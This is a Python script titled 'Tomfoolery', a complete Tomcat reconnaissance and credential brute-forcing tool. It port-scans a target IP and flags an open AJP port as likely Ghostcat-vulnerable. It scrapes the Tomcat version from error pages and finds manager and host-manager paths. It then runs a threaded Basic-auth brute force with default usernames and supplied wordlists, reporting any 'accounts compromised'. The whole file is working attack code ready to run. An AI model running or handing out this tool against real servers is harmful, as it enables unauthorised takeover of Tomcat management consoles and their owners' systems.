import requests
import threading
import socket
import re
import sys
import os
from queue import Queue
from tqdm import tqdm

# --- CONFIGURATION ---
COMMON_WEB_PORTS = [80, 81, 8080, 8000, 8081, 8443, 8888, 9090, 9443]
TOMCAT_PATHS = ["/manager/html", "/manager/status", "/host-manager/html"]
DEFAULT_USERS = ["tomcat", "admin", "manager", "root", "both", "role1"]
MAX_THREADS = 15
TIMEOUT = 3

# Disable insecure request warnings for HTTPS targets
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_port(ip, port, open_ports):
    """Fast socket scanner to identify open ports."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
    except: pass

def check_ajp(ip):
    """Checks specifically for AJP (Port 8009)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.5)
            if s.connect_ex((ip, 8009)) == 0:
                return True
    except: pass
    return False

def enumerate_tomcat(ip, port):
    """Identifies Tomcat version and verifies accessible paths using Headers."""
    base_url = f"http://{ip}:{port}"
    found_paths = []
    version = "Unknown"

    # 1. Force a 404 to scrape the version (CWE-200)
    try:
        r = requests.get(f"{base_url}/invalid_path_9999", timeout=TIMEOUT, verify=False)
        match = re.search(r"Apache Tomcat/\d+\.\d+\.\d+", r.text)
        if match:
            version = match.group(0)
    except: pass

    # 2. Check Paths using WWW-Authenticate Header
    for path in TOMCAT_PATHS:
        url = f"{base_url}{path}"
        try:
            r = requests.get(url, timeout=TIMEOUT, verify=False)
            
            # Auth Bypass Check (CWE-287)
            if r.status_code == 200:
                print(f"[!!!] CRITICAL: Auth Bypass! No password required for {url}")
                found_paths.append(url)
                continue
                
            # Proper Tomcat Fingerprint: The WWW-Authenticate header
            auth_header = r.headers.get('WWW-Authenticate', '')
            if r.status_code == 401 and ('Tomcat' in auth_header or 'Basic realm' in auth_header):
                found_paths.append(url)
        except: pass

    return version, found_paths

class BruteForceEngine:
    def __init__(self, url, creds):
        self.url = url
        self.creds = creds
        self.queue = Queue()
        self.found_accounts = []
        self.pbar = None

    def worker(self):
        # Use a Session for connection pooling (much faster)
        session = requests.Session()
        while not self.queue.empty():
            user, pwd = self.queue.get()
            try:
                r = session.get(self.url, auth=(user, pwd), timeout=TIMEOUT, verify=False)
                if r.status_code == 200:
                    # Use tqdm.write so we don't break the visual progress bar
                    tqdm.write(f"\n[$$$] LETHAL HIT: Valid Credentials Found -> User: '{user}' | Pass: '{pwd}'")
                    self.found_accounts.append((user, pwd))
            except: pass
            
            self.pbar.update(1)
            self.queue.task_done()

    def run(self):
        for c in self.creds:
            self.queue.put(c)
        
        self.pbar = tqdm(total=len(self.creds), desc=f"Brute Forcing", unit="req", dynamic_ncols=True)
        
        threads = []
        for _ in range(MAX_THREADS):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        self.queue.join() # Wait for queue to empty
        self.pbar.close()
        return self.found_accounts

def main():
    print("=== Tomfoolery - Tomcat Recon and Brute Forcer ===")
    target = input("Target IP: ").strip()
    u_list_path = input("Username wordlist path (Leave blank for defaults): ").strip()
    p_list_path = input("Password wordlist path: ").strip()

    if not p_list_path:
        print("\n[-] Error: A password wordlist is strictly required. Exiting.")
        sys.exit(1)

    # --- PHASE 1: Discovery ---
    print(f"\n[*] Phase 1: Discovering Open Web Ports...")
    open_ports = []
    threads = []
    for port in COMMON_WEB_PORTS:
        t = threading.Thread(target=check_port, args=(target, port, open_ports))
        t.start()
        threads.append(t)
    for t in threads: t.join()

    if not open_ports:
        print("[-] No common web ports open. Exiting.")
        sys.exit(0)
    print(f"[+] Open web ports identified: {open_ports}")

    # --- PHASE 2: AJP & Protocol Bypass ---
    print("\n[*] Phase 2: Checking AJP (Port 8009) for Ghostcat...")
    if check_ajp(target):
        print("[!!!] WARNING: AJP Port 8009 is OPEN.")
        print("    -> Target is likely vulnerable to Ghostcat (CVE-2020-1938).")
        print("    -> You can bypass auth entirely using AJP file inclusion.")
    else:
        print("[-] Port 8009 Closed. AJP Bypass not possible.")

    # --- PHASE 3: Enumeration ---
    print("\n[*] Phase 3: Enumerating Tomcat Services...")
    all_targets = []
    for port in open_ports:
        version, paths = enumerate_tomcat(target, port)
        if paths:
            print(f"[+] Tomcat identified on Port {port} | Version: {version}")
            for p in paths:
                print(f"    -> Verified Path: {p}")
                all_targets.append(p)

    if not all_targets:
        print("[-] No accessible Tomcat Manager paths found on open ports. Exiting.")
        sys.exit(0)

    # --- PHASE 4: Credential Processing ---
    print(f"\n[*] Phase 4: Loading Wordlists...")
    
    # Process Usernames
    users = DEFAULT_USERS
    if u_list_path:
        if not os.path.exists(u_list_path):
            print(f"[-] Error: Username file '{u_list_path}' not found. Exiting.")
            sys.exit(1)
        try:
            with open(u_list_path, 'r', errors='ignore') as uf:
                users = [line.strip() for line in uf if line.strip()]
            if not users:
                print(f"[-] Error: Username file '{u_list_path}' is empty. Exiting.")
                sys.exit(1)
            print(f"[+] Loaded {len(users)} custom usernames.")
        except Exception as e:
            print(f"[-] Error reading username wordlist: {e}")
            sys.exit(1)
    else:
        print(f"[+] Using default targeted users ({len(users)}).")

    # Process Passwords & Combine
    creds = []
    if not os.path.exists(p_list_path):
        print(f"[-] Error: Password file '{p_list_path}' not found. Exiting.")
        sys.exit(1)
        
    try:
        with open(p_list_path, 'r', errors='ignore') as pf:
            passwords = [line.strip() for line in pf if line.strip()]
            
        if not passwords:
            print(f"[-] Error: Password file '{p_list_path}' is empty. Exiting.")
            sys.exit(1)
            
        # Build Cartesian product (or parse user:pass directly if detected in pwd file)
        for p in passwords:
            if ':' in p:
                parts = p.split(':', 1)
                creds.append((parts[0], parts[1]))
            else:
                for u in users:
                    creds.append((u, p))
                    
    except Exception as e:
        print(f"[-] Error reading password wordlist: {e}")
        sys.exit(1)
        
    print(f"[+] Wordlists successfully processed. Total combinations to test: {len(creds)}")

    # --- PHASE 5: Brute Force ---
    print("\n[*] Phase 5: Executing Brute Force Attack, break a leg...")
    for target_url in all_targets:
        print(f"\n[*] Targeting: {target_url}")
        engine = BruteForceEngine(target_url, creds)
        try:
            results = engine.run()
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user.")
            sys.exit(0)
            
        if results:
            print(f"\n[+] Finished attack on {target_url}. Total accounts compromised: {len(results)}")
        else:
            print(f"\n[-] Finished attack on {target_url}. No credentials found.")

if __name__ == "__main__":
    main()
